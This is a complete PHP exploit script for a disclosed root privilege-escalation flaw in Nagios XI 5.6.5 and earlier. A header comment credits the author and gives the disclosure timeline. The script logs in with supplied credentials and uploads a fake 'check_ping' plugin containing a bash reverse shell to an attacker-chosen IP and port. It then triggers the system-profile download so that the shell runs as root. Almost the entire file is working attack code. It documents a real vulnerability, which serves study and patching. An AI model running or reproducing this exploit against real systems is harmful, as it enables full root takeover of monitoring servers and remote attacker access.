<?php

/*
A vulnerability exists in Nagios XI <= 5.6.5 allowing an attacker to leverage an RCE to escalate privileges to root.
The exploit requires access to the server as the 'nagios' user, or CCM access via the web interface with perissions to manage plugins.

The getprofile.sh script, invoked by downloading a system profile (profile.php?cmd=download),
is executed as root via a passwordless sudo entry; the script executes the ‘check_plugin’ executuable which is owned by the nagios user
A user logged into Nagios XI with permissions to modify plugins, or the 'nagios' user on the server,can modify the ‘check_plugin’ executable
and insert malicious commands exectuable as root.

Author: Jak Gibb (https://github.com/jakgibb/nagiosxi-root-rce-exploit)

Date discovered: 28th July 2019
Reported to Nagios: 29th July 2019
Confirmed by Nagios: 29th July 2019
*/

$userVal = parseArgs($argv);

checkCookie();
$userVal['loginNSP'] = extractNSP($userVal['loginUrl']);
authenticate($userVal);

$userVal['pluginNSP'] = extractNSP($userVal['pluginUrl']);

uploadPayload($userVal);
triggerPayload($userVal);

function extractNSP($url) {

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);;
    curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);

    echo "[+] Grabbing NSP from: {$url}\n";
    $response = curl_exec($curl);
    $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);

    if ($httpCode == '200') {
        echo "[+] Retrieved page contents from: {$url}\n";
    } else {
        echo "[+] Unable to open page: {$url} to obtain NSP\n";
        exit(1);
    }

    $DOM = new DOMDocument();
    @$DOM->loadHTML($response);
    $xpath = new DOMXpath($DOM);
    $input = $xpath->query('//input[@name="nsp"]');
    $nsp = $input->item(0)->getAttribute('value');

    if (isset($nsp)) {
        echo "[+] Extracted NSP - value: {$nsp}\n";
    } else {
        echo "[+] Unable to obtain NSP from {$url}\n";
        exit(1);
    }

    return $nsp;

}

function authenticate($userVal) {

    $postValues = array(
        'username' => $userVal['user'], 'password' => $userVal['pass'],
        'pageopt' => 'login', 'nsp' => $userVal['loginNSP']
    );

    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $userVal['loginUrl']);
    curl_setopt($curl, CURLOPT_POST, TRUE);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($postValues));
    curl_setopt($curl, CURLOPT_REFERER, $userVal['loginUrl']);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);

    echo "[+] Attempting to login...\n";
    curl_exec($curl);
    if (curl_getinfo($curl, CURLINFO_HTTP_CODE) == '302') {
        echo "[+] Authentication success\n";
    } else {
        echo "[+] Unable to plguin, check your credentials\n";
        exit(1);
    }

    echo "[+] Checking we have admin rights...\n";
    curl_setopt($curl, CURLOPT_URL, $userVal['pluginUrl']);
    $response = curl_exec($curl);

    $title = NULL;

    $dom = new DOMDocument();
    if (@$dom->loadHTML($response)) {
        $dom->getElementsByTagName("title")->length > 0 ? $title = $dom->getElementsByTagName("title")->item(0)->textContent : FALSE;
    }

    if (strpos($title, 'Manage') !== FALSE) {
        echo "[+] Admin access confirmed\n";
    } else {
        echo "[+] Unable to reach login page, are you admin?\n";
        exit(1);
    }

}

function uploadPayload($userVal) {

    $payload = "-----------------------------18467633426500\nContent-Disposition: form-data; name=\"upload\"\n\n1\n-----------------------------18467633426500\nContent-Disposition: form-data; name=\"nsp\"\n\n{$userVal['pluginNSP']}\n-----------------------------18467633426500\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n20000000\n-----------------------------18467633426500\nContent-Disposition: form-data; name=\"uploadedfile\"; filename=\"check_ping\"\nContent-Type: text/plain\n\nbash -i >& /dev/tcp/{$userVal['reverseip']}/{$userVal['reverseport']} 0>&1\n-----------------------------18467633426500--\n";

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $userVal['pluginUrl']);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookie.txt');

    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
    $headers[] = 'Accept-Language: en-GB,en;q=0.5';
    $headers[] = 'Referer: ' . $userVal['pluginUrl'];
    $headers[] = 'Content-Type: multipart/form-data; boundary=---------------------------18467633426500';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Upgrade-Insecure-Requests: 1';

    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    echo "[+] Uploading payload...\n";

    $response = curl_exec($curl);
    $dom = new DOMDocument();
    @$dom->loadHTML($response);

    $upload = FALSE;

    foreach ($dom->getElementsByTagName('div') as $div) {

        if ($div->getAttribute('class') === 'message') {
            if (strpos($div->nodeValue, 'New plugin was installed') !== FALSE) {
                $upload = TRUE;
            }
        }
    }

    if ($upload) {
        echo "[+] Payload uploaded\n";
    } else {
        echo '[+] Unable to upload payload';
        exit(1);
    }

}

function triggerPayload($userVal) {

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $userVal['profileGenUrl']);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_ENCODING, 'gzip, deflate');
    curl_setopt($curl, CURLOPT_COOKIEFILE, 'cookie.txt');

    $headers = array();
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Upgrade-Insecure-Requests: 1';

    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

    echo "[+] Triggering payload: if successful, a reverse shell will spawn at {$userVal['reverseip']}:{$userVal['reverseport']}\n";

    curl_exec($curl);

}

function showHelp() {
    echo "Usage: php exploit.php --host=example.com --ssl=[true/false] --user=username --pass=password --reverseip=ip --reverseport=port\n";
    exit(0);
}

function parseArgs($argv) {

    $userVal = array();
    for ($i = 1; $i < count($argv); $i++) {
        if (preg_match('/^--([^=]+)=(.*)/', $argv[$i], $match)) {
            $userVal[$match[1]] = $match[2];
        }
    }

    if (!isset($userVal['host']) || !isset($userVal['ssl']) || !isset($userVal['user']) || !isset($userVal['pass']) || !isset($userVal['reverseip']) || !isset($userVal['reverseport'])) {
        showHelp();
    }

    $userVal['ssl'] == 'true' ? $userVal['proto'] = 'https://' : $userVal['proto'] = 'http://';
    $userVal['loginUrl'] = $userVal['proto'] . $userVal['host'] . '/nagiosxi/login.php';
    $userVal['pluginUrl'] = $userVal['proto'] . $userVal['host'] . '/nagiosxi/admin/monitoringplugins.php';
    $userVal['profileGenUrl'] = $userVal['proto'] . $userVal['host'] . '/nagiosxi/includes/components/profile/profile.php?cmd=download';

    return $userVal;

}

function checkCookie() {
    if (file_exists('cookie.txt')) {
        echo "cookie.txt already exists - delete prior to running";
        exit(1);
    }
}